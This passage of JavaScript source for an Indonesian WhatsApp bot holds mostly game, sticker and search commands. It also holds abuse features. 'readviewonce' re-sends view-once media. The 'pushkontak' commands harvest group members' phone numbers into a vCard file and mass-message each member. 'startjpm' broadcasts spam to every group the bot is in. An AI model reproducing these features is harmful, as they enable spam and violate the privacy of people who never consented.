await RezzHost.sendMessage(from, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k',
title: `XYRISKY HOST - MD`,
sourceUrl: `https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k`, 
thumbnail: "https://telegra.ph/file/8ee7582873a72e9f1a82c.jpg"
}
}})
break
case "premium": case "buyprem": {
m.reply(`\n*💸 LIST HARGA USER PREMIUM*

*乂 PAKET A*
*Harga Rp5.000*
◦ Gratis Balance $10.000.000.000
◦ Gratis Limit 10.000
◦ Akses fitur premium
◦ Akses fitur claim limit & balance harian

*乂 PAKET B*
*Harga Rp10.000*
◦ Gratis Balance $30.000.000.000
◦ Gratis Limit 20.000
◦ Akses fitur premium
◦ Akses fitur claim limit & balance harian

*乂 PAKET C*
*Harga Rp15.000*
◦ Gratis Balance $50.000.000.000
◦ Gratis Limit 30.000
◦ Akses fitur premium
◦ Akses fitur claim limit & balance harian


Hubungi owner bot untuk membeli paket *User Premium* dengan cara ketik .owner\n`)}
break

case "redeemcode": {
if (!args[0]) return m.reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return m.reply("*Code Redeem* wajib huruf kecil semua!")
if (db.data.settings.hadiahkadaluwarsa.includes(args[0])) return m.reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.hadiah.includes(args[0])) return m.reply("*Code* tidak valid!")
db.data.settings.hadiahkadaluwarsa.push(args[0])
var code = db.data.settings.hadiah.indexOf(args[0])
db.data.settings.hadiah.splice(code, 1)
let h1 = randomNumber(20000, 30000)
let h2 = randomNumber(10, 20)
db.data.users[m.sender].balance += h1
db.data.users[m.sender].limit += h2
var teks = `Selamat kepada @${m.sender.split("@")[0]} 🎉

kamu mendapatkan *Balance  $${toRupiah(h1)}* dan *${h2} Limit* dari *Code Redeem "${args[0]}"*`
await m.reply(`Berhasil mengambil hadiah *$${toRupiah(h1)} Balance* dan *${h2} Limit* dari *Code Redeem ${args[0]}*`).then(() => {
RezzHost.sendMessage(m.chat, {text: teks, contextInfo: {mentionedJid: [m.sender], externalAdReply: { thumbnailUrl: thumbnail, title: "© Message System Notifikasi", body: null, sourceUrl: linkgc, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: kalgans})
})}
break

case "topglobal": {
m.reply(mess.wait)
let ubalance = Object.entries(global.db.data.users).map(([key, value]) => {return {...value, jid: key}})
let sortedbalance = ubalance.map(toNumber('balance')).sort(sort('balance'))
let usersbalance = sortedbalance.map(enumGetKey)
m.reply(`\n*🏆 LIST TOP GLOBAL BALANCE*\n\nKamu Top *${usersbalance.indexOf(m?.sender) + 1}* Balance dari *${usersbalance.length}* Users

${sortedbalance.slice(0, 10).map(({ jid, balance }, i) => `${i + 1}. *Nama :* @${db.data.users[jid].name}\n*Nomor :* ${jid.split("@")[0]}\n*Balance :* $${toRupiah(balance)}\n`).join('\n')}\n`)}
break

case 'readvo': case 'readviewonce': {
if (!m.quoted) return m.reply('reply gambar/video yang ingin Anda lihat')
if (m.quoted.mtype !== 'viewOnceMessageV2') return m.reply('Ini bukan pesan view-once.')
let msg = m.quoted.message
let type = Object.keys(msg)[0]
const { downloadContentFromMessage } = require('@whiskeysockets/baileys')
let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
return RezzHost.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
} else if (/image/.test(type)) {
return RezzHost.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
}
}
break

case "buylimit": case "belilimit": {
if (!args[0]) return m.reply('100\n\nHarga 1 *limit* = $1000 *balance*')
if (isNaN(args[0])) return m.reply('20')
if ((args[0]).includes('.')) return m.reply('20')
let harga = 1000
let total = Number(parseInt(args[0]) * harga)
if (balancenya < total) return m.reply(`*Balance* kamu tidak cukup untuk membeli ${args[0]} *Limit!*\n\nDapatkan *Balance* dengan cara memainkan game`)
db.data.users[m?.sender].limit += Number(args[0])
db.data.users[m?.sender].balance -= total
m.reply(`Berhasil membeli *${args[0]}* limit, dengan *$${toRupiah(total)}* balance`)
}
break
case 'pushkontak': {
if (!isZeroone) return reply("Nanti Mager")
ZeroOffcial.sendList(m.chat, "Result", "Powered By 𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖", {
title: 'PILIH FORMAT', sections: [{
title: "Pilih Format Yang Ingin Anda Gunakan",
rows: [
{
title: "Pushkontak gc V1",
description: "Push kontak delay 1 detik",
id: `.pushkontakgcjd ${text1}`
}, {
title: "Pushkontak gc V2",
description: "Push kontak delay 2 detik",
id: `.pushkontakgcjd ${global.text1}`
}, {
title: "Pushkontak gc V3",
description: "Push kontak delay 5 detik",
id: `.pushkontakgcjd ${text1}`
}
]
}]
})
}
break
case "pushkontakgcjd": {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply("pesannya")
var teks = text
const halls = await groupMetadata.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await RezzHost.sendMessage(mem, {text: teks}, {quoted: kalgans})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await RezzHost.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "pushkontak1": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup")
if (!text.split("|")) return m.reply(example("idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup"))
var [idnya, teks] = text.split("|")
var groupMetadataa
try {
groupMetadataa = await RezzHost.groupMetadata(`${idnya}`)
} catch (e) {
return m.reply("*ID Grup* tidak valid!")
}
const participants = await groupMetadataa.participants
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
m.reply(`Memproses Mengirim Pesan Ke *${halls.length}* Member Grup`)
for (let mem of halls) {
if (mem !== m.sender) {
contacts.push(mem)
await fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
await RezzHost.sendMessage(mem, {text: teks}, {quoted: kalgans})
await sleep(global.delaypushkontak)
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Sv [${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`Berhasil Mengirim Pesan Ke *${halls.length} Member Grup*, File Contact Berhasil Dikirim ke Private Chat`)
await RezzHost.sendMessage(m.sender, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "File Contact Berhasil Di Buat✅", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./database/contacts.vcf", "")
}}
break

case "listgc": case "cekid": case"listgrup": {
let gcall = Object.values(await RezzHost.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST ALL CHAT GRUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break

case "startjpm": {
if (!isCreator) return m.reply(mess.owner)
var teksnya = await fs.readFileSync("./database/teksjpm.js").toString()
if (teksnya.length < 1) return m.reply("Teks Jpm Tidak Ditemukan, Silahlan Isi/Edit Teks Jpm Didalam Folder database")
var teks = `${teksnya}`
let total = 0
let getGroups = await RezzHost.groupFetchAllParticipating()
let usergc = await Object.keys(getGroups)
m.reply(`Memproses Mengirim Pesan *Text* Ke *${usergc.length}* Grup`)
for (let jid of usergc) {
try {
await RezzHost.sendMessage(jid, {text: teks}, {quoted: kalgans})
total += 1
} catch {}
await sleep(4000)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break

case "setteksjpm": {
if (!isCreator) return m.reply(mess.owner)
if (text || m.quoted) {
const newteks = m.quoted ? m.quoted.text : text
await fs.writeFileSync("./database/teksjpm.js", newteks.toString())
m.reply("Berhasil Mengganti Teks JPM ✅")
} else {
return m.reply("dengan reply/kirim teks\n\nUntuk melihat teks jpm saat ini ketik *.teksjpm*")
}}
break

case "teksjpm": {
if (!isCreator) return m.reply(mess.owner)
m.reply(fs.readFileSync("./database/teksjpm.js").toString())
}
break

case "claim": {
if (!isPremium) return m.reply(mess.premium)
if (db.data.users[m.sender].claim == 0) return m.reply("Kamu sudah *Claim* hadiah hari ini, hadiah *Claim* akan direset saat jam 12 malam!")
const hadiah = randomNumber(50000, 70000)
const hadiah2 = randomNumber(100, 200)
db.data.users[m.sender].balance += hadiah
db.data.users[m.sender].limit += hadiah2
db.data.users[m.sender].claim = 0
m.reply(`Berhasil *Claim* hadiah harian\n\n+ $${toRupiah(hadiah)} *Balance*\n+ ${hadiah2} *Limit*`)
}
break
case 'cekkhodam':
case 'cekhodam': {
if (!q) return reply("ketik nama lu anjg")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	  "Siluman Tobrut",
	  "Tobrut Ireng",
	])
  
	const response = `
╾─────╼[ CEK KHODAM]╾─────╼

♙ *Nama :* ${text}
♗ *Khodam :* ${khodam}
╾───────────────────────╼
	  `
	m.reply(response)
  }
break
case "claimprem": {
if (!args[0]) return m.reply("Codenya")
if (args[0] !== args[0].toLowerCase()) return m.reply("*Code Claim Prem* wajib huruf kecil semua!")
if (db.data.settings.claimpremkadaluwarsa.includes(args[0])) return m.reply("*Code* tersebut sudah digunakan!")
if (!db.data.settings.claimprem.includes(args[0])) return m.reply("*Code* tidak valid!")
db.data.settings.claimpremkadaluwarsa.push(args[0])
var code = db.data.settings.claimprem.indexOf(args[0])
db.data.settings.claimprem.splice(code, 1)
let h1 = randomNumber(20000, 30000)
let h2 = randomNumber(10, 20)
let h3 = randomNumber(10, 20)
db.data.users[m?.sender].balance += h1
db.data.users[m?.sender].limit += h2
db.data.users[m?.sender].glimit += h3
db.data.users[m?.sender].premium = true
var teks = `Selamat kepada @${m?.sender.split("@")[0]} 🎉

kamu mendapatkan *Balance  $${toRupiah(h1)}* dan *${h2} Limit* dan *${h3} Limit Game* dari *Code Redeem "${args[0]}"*`
await m.reply(`Berhasil mengambil claim prem *$${toRupiah(h1)} Balance* dan *${h2} Limit* dan *${h3} Limit Game* dari *Code Redeem ${args[0]}*`).then(() => {
RezzHost.sendMessage(m?.chat, {text: teks, contextInfo: {mentionedJid: [m?.sender], externalAdReply: { thumbnailUrl: ppuser, title: "© Message System Notifikasi", body: null, sourceUrl: linkchannel, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: kalgans})
})}
break

case 'tqto': {
let cu = `Brikut Adalah Orang orang yang terkait dalam pembuatan secrip ini

*BIG TAHNKS TO*

> Hw Mods [ Base ]
> XYREZZ [ Developer ]
> Ikyy Offc [ My Friends ]
> Sanjaya [ My Friends ]

Rekomendasi Link Channel Whatsapp
PANEL MURAH
Share Case
Share Plugins
Share Sc GG
(paling rekomendasi)
https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k (My saluran)
----------------------------------------------
https://whatsapp.com/channel/0029VajY8NI9RZAQBUpCyD0d (Saluran 2)
----------------------------------------------
https://whatsapp.com/channel/0029VabHsw01NCrVkoHw551y (Saluran 3)
----------------------------------------------
https://whatsapp.com/channel/0029VaeDkpbEFeXdgASyZ60B (HandzOfc)
----------------------------------------------
https://whatsapp.com/channel/0029VacxTsC8F2p5dshCmq3r (Xyrezz)
----------------------------------------------
https://whatsapp.com/channel/0029VadGkCU0QearvRAspD1i (ZanPiw)
----------------------------------------------
https://whatsapp.com/channel/0029VaTck0W6GcGMwiq4tQ3k (Fernazer)
----------------------------------------------
`
let cp = (cu)
RezzHost.sendMessage(m?.chat, {
text: cp,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | RISKY HOST`,
body: '',
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break

case 'listcase': {
let { listCase } = require('./lib/scrapelistCase.js')
m.reply(listCase())
}
break

case "ceklimit": case "limit": case "me":
case "balance": case "cekbalance": case "my": {
if (m.quoted) {
try {
ppuser = await RezzHost.profilePictureUrl(pengirim, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}    
let teksnya = `
  ◦ Name : *${pushname}*
  ◦ Number : *@${m.sender.split('@')[0]}*
  ◦ Limit : *${limitnya}*
  ◦ Balance : *$${toRupiah(balancenya)}*`
RezzHost.sendMessage(m.chat, {text: teksnya, 
contextInfo: {
externalAdReply: {
thumbnailUrl: thumbnail, 
title: '©User Info Message', 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${m.sender.split('@')[0]}`, 
mediaType: 1}}}, {quoted: kalgans})
} else {
let teksnya = `
  ◦ Name : *${pushname}*
  ◦ Number : *@${m.sender.split('@')[0]}*
  ◦ Limit : *${limitnya}*
  ◦ Balance : *$${toRupiah(balancenya)}*`
RezzHost.sendMessage(m.chat, {text: teksnya, 
contextInfo: {
externalAdReply: {
thumbnailUrl: thumbnail, 
title: '©User Info Message', 
renderLargerThumbnail: true, 
sourceUrl: `https://wa.me/${m.sender.split('@')[0]}`, 
mediaType: 1}}}, {quoted: kalgans})
}}
break

case 'qc': {
if (limitnya < 1) return m.reply(mess.limit)
if (!q) return m.reply(`📌Example: ${prefix + command} hallo`)
let obj = {
type: 'quote',
format: 'png',
backgroundColor: '#ffffff',
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await RezzHost.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: `${q}`,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
RezzHost.sendImageAsSticker(m.chat, buffer, kalgans, { packname: `${global.packname}`, author: `${global.author}`})
uselimit()}
break

case 'qc2': {
if (!q) return m.reply(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return m.reply(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return m.reply('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await RezzHost.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
RezzHost.sendImageAsSticker(m.chat, buffer, kalgans, { packname: `${global.packname}`, author: `${global.author}`})
}
break

case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (limitnya < 1) return m.reply(mess.limit)
 if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await RezzHost.sendImageAsStickerAV(from, media, kalgans, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await RezzHost.sendVideoAsSticker(from, media, fcall, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
uselimit()}
break

case 'tiktoksearch': case 'ttsearch':{
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
let anu = await mann.search.tiktoks(text)
const capt = anu.title
const author = anu.author

let msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: [m.sender], 
isForwarded: true, 
forwardedNewsletterMessageInfo: {
newsletterJid: `https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k`,
newsletterName: `"RISKY OFCS"`, 
serverMessageId: -1
},
businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
}, 
body: proto.Message.InteractiveMessage.Body.create({
 text: (`*Author* : ${author}\n*Caption* : ${capt}`)
}),
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Simpel WhatsApp Bot`
}),
header: proto.Message.InteractiveMessage.Header.create({
title: (`Tik Tok - Search`),
subtitle: `${ownername}`,
hasMediaAttachment: true,...(await prepareWAMessageMedia({ video: { url: anu.no_watermark } }, { upload: RezzHost.waUploadToServer }))
}),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [ 
{
"name": "quick_reply",
"buttonParamsJson": `{\"display_text\":\"Next\",\"id\":\".tiktoksearch ${text}\"}`
},
]
})
})
}
}
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
messageId: msg.key.id
})
uselimit()}
break

case 'toimage': case 'toimg': {
if (limitnya < 1) return m.reply(mess.limit)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
RezzHost.sendMessage(from, { image: buffer }, {quoted:kalgans})
fs.unlinkSync(ran)
})
uselimit()}
break

case 'remini': {
if (!quoted) return m.reply(`Where is the picture?`)
if (!/image/.test(mime)) return m.reply(`Send/Reply Photos With Captions ${prefix + command}`)
const { remini } = require('./lib/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance")
RezzHost.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: kalgans})
}
break

case 'jarak': {
if (limitnya < 1) return m.reply(mess.limit)
var [me, to] = text.split`|`
if (!(from && to)) return m.reply(`example ${prefix + command} Yogyakarta|Jakarta`)
m.reply(mess.search)
var data = await jarakkota(me, to)
if (data.img) return RezzHost.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: kalgans })
uselimit()}
break

case 'pin': case 'pinterest': {
if (limitnya < 1) return m.reply(mess.limit)
if (!text) return m.reply(`*Example*: ${prefix + command} ${botname}`)
  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: RezzHost.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res);
  let ult = res.splice(0, 10);
  let i = 1;

  for (let lucuy of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `• VPS\n• PANEL PETRODACTYL\n• SECRIP BOT WHATSAPP\n• DAN MASIH BANYAK LAGI`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ownername
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖 MENYEDIAKAN :',
        hasMediaAttachment: true,
        imageMessage: await createImage(lucuy)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"MY OWNER","url":"https://wa.me/6282173242194","merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"MY CHANEL OWNER","url":"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k,"merchant_url":"https://www.google.com"}`
          }, {
            "name": "cta_url",
            "buttonParamsJson": `{"display_text":"SOURCE","url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}","merchant_url":"https://www.pinterest.com/search/pins/?rs=typed&q=${text}"}`
          }
        ]
      })
    });
  }

  const bot = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: mess.done
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'HASIL PENCARIAN RISKY HOST'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await RezzHost.relayMessage(m.chat, bot.message, {
    messageId: bot.key.id
  });
  
}
break

case 'ttsearch': case 'ttscroll': case 'tiktoksearch': {
if (!text) return m.reply("Masukan Query!")
    let old = new Date();
    let json;
    try {
        json = await fetchJson(`https://skizo.tech/api/tiktok-search?apikey=${skizo}&keywords=${text}`);
    } catch (err) {
        return m.reply(`Terjadi kesalahan saat mengambil data: ${err.message}`);
    }

    function pickRandom(arr) {
        return arr[Math.floor(Math.random() * arr.length)];
    }
    
    var hiasan = "=> ";

    // Ensure json has enough elements
    if (!json || json.length < 8) return m.reply('Data tidak lengkap untuk membuat scroll.');

    let json1 = pickRandom([json[0], json[1], json[3]]);
    let json2 = pickRandom([json[5], json[6], json[7]]);
    let json3 = pickRandom([json[8], json[2]]);
    let json4 = pickRandom([json[7], json[3], json[6]]);
    let json5 = pickRandom([json[4], json[0], json[1]]);

    async function video(url) {
        if (!url) throw new Error('URL video tidak tersedia.');
        const { videoMessage } = await generateWAMessageContent({
            video: {
                url
            }
        }, {
            upload: RezzHost.waUploadToServer
        });
        return videoMessage;
    }

    try {
        let msg = generateWAMessageFromContent(
            m.chat,
            {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            body: {
